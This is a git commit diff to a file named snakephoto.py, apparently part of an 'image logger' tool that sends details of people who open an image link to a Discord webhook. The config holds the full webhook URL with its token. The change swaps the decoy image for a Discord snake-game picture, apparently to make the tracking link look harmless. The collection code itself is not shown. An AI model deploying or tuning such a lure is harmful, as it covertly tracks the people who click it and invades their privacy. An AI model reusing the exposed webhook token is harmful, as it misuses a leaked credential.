2a2eae6f6c49de7a51dd487fc7ff837747760481
YourRobloxian <135187702+YourRobloxian@users.noreply.github.com>
2024-01-22 11:55:34 -0500

    Update snakephoto.py

--- api/snakephoto.py
+++ api/snakephoto.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1199033145983516813/adj55gsOsBMzmHVemDQkaybyK4KAXK0eirXHtPMLYb94z9HeD0wkFqf74pcIOhR3f44S",
-    "image": "https://i.redd.it/2atjz02sk9u21.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://images.saymedia-content.com/.image/t_share/MTk2MTIxNzg5MDMyNTcyMDQ5/discord-snake-game.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
